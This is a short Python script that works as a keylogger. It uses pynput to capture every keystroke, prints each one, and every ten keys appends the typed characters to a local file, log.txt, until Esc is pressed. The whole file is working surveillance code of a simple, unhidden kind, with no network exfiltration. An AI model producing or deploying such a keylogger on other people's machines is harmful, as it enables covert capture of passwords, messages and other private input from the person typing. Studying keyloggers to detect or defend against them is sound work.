import pynput

from pynput.keyboard import Key, Listener

count = 0   #break or quit program without pressing esc keys will not store in text file but count allow us to update text file
keys  = []

def on_press(key):
    global keys, count
    
    keys.append(key)
    count+=1
    print("[0] pressed",format(key))

    if count >= 10:
        count = 0       #storing keys in keys[] after count it will  update text file then count =0 and keys[] are empty
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
